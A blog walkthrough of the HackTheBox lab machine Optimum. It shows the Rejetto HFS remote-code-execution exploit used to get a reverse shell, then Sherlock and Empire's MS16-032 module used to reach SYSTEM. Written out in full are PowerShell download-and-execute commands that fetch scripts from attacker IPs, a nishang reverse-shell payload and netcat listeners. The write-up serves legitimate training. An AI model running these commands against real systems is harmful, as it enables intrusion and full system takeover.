---
layout: post
title: "HackTheBox - Optimum"
description: "Walkthrough of Optimum box on Hackthebox."
thumb_image: "documentation/optimumthumb.png"
tags: [ hackthebox ]
---

{% include image.html path="documentation/optimum.webp"
path-detail="documentation/optimum.webp"
alt="HTB Optimum" %}

## HTB - Optimum

IP - 10.10.10.8

### Overview

This box was an easy level windows box on HTB created by [ch4p](https://www.hackthebox.eu/home/users/profile/1), it started with gaining user shell via a RCE exploit in the `HFS server` that is running on port 80. In post enumeration, we use `Sherlock` that finds a local privesc exploit `MS16-32`, we use it’s poc script present in `Empire` to get a shell as `NT Authority\System`.

### Enumeration

As always let’s start off with nmap script nmap -sC for default scripts ~~Alright, if it isn’t obvious yet I am a IPPSEC fanboi.~~ Aight, firing up nmap to scan all open ports on the box.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Optimum]
└──╼ $sudo nmap -sC -sV -o nmap/initial 10.10.10.8
{% endhighlight %} 
And here is our nmap result
{% highlight bash %}
# Nmap 7.80 scan initiated Wed Nov  4 01:33:16 2020 as: nmap -sC -sV -o nmap/initial 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.081s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov  4 01:33:42 2020 -- 1 IP address (1 host up) scanned in 26.12 seconds
{% endhighlight %}

We only have one port open, so let’s start enumerating it.

#### Foothold

Let’s start enumerating by looking at webpage of the `HttpFileServer`. 
{% include image.html path="documentation/Optimumweb.webp"
path-detail="documentation/Optimumweb.webp"
alt="HTB Optimum" %}

Hovering over the link in bottom left corner confirms that it is `Rejetto HttpFileServer 2.3`, so let’s look for it’s exploits.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Optimum]
└──╼ $searchsploit hfs
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service                                    | osx/dos/29454.txt
Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)                                              | osx/dos/12375.c
Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure                                          | osx/local/35488.c
Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation                                   | osx/local/8266.txt
FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution                                           | windows/remote/37985.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                          | multiple/remote/48569.py
Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service                                          | linux/dos/28895.txt
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                               | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                    | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                       | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                  | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                  | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                             | windows/webapps/34852.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
{% endhighlight %} 

And we get one python RCE exploit, `windows/remote/39161.py`.

### Getting User

On reading the exploit script, the comments had the instructions that, we will have to host a `nc.exe` so that it can be used by the exploit to give a reverse shell and change our `Lhost IP address` and `Port Number` in the exploit script to get a reverse shell.

After modifying the script, let’s start a listner using `rlwrap nc -lvnp 9889` and host the netcat binary using python3 http server.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Optimum]
└──╼ $sudo python3 -m http.server 80
{% endhighlight %} 

Time to run the exploit.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Optimum]
└──╼ $python 39161.py 10.10.10.8 80
{% endhighlight %} 

Looking at our netcat server and yes we got our shell.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Optimum]
└──╼ $rlwrap nc -lvnp 9889
listening on [any] 9889 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.8] 49188
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>
{% endhighlight %} 

The exploit workflow will be like this. 
{% include image.html path="documentation/Optimumuser.gif"
path-detail="documentation/Optimumuser.gif"
alt="HTB Optimum" %}

### Getting Root

In post enumeration, running [Sherlock](https://github.com/rasta-mouse/Sherlock) to find any privilege escalation exploit. _Also consider trying watson for this enumeration, I used Sherlock because i don’t have a windows system to build Watson’s binary._

{% highlight bash %}
C:\Users\kostas\Desktop>@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.33:8000/Sherlock.ps1'))"
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.33:8000/Sherlock.ps1'))"

[REDACTED]
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Appears Vulnerable
[REDACTED]
{% endhighlight %} 

Luckily [Empire](https://github.com/EmpireProject/Empire) has a exploit configured for this CVE, [Invoke-MS16032](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1), we add the following command to download and execute our powershell revshell exploit from nishang in the exploit and now we are ready to root the box[Get shell as system].

{% highlight bash %}
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.11:8000/Invoke-PowerShellTcp.ps1')
{% endhighlight %} 

Hosting our nishang reverse shell via `python3 -m http.server 8000` and running the exploit.

{% highlight bash %}
C:\Users\kostas\Desktop>@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.33:8000/Invoke-MS16032.ps1'))"
...
{% endhighlight %} 

Looking at our shell and yep we got as `NT Authority/System`.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Optimum_Rooted]
└──╼ $rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.8] 49194
Windows PowerShell running as user OPTIMUM$ on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop>whoami
nt authority\system
{% endhighlight %} 

The privesc exploit workflow will be like this. 
{% include image.html path="documentation/Optimumroot.gif"
path-detail="documentation/Optimumroot.gif"
alt="HTB Optimum" %}

###### Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.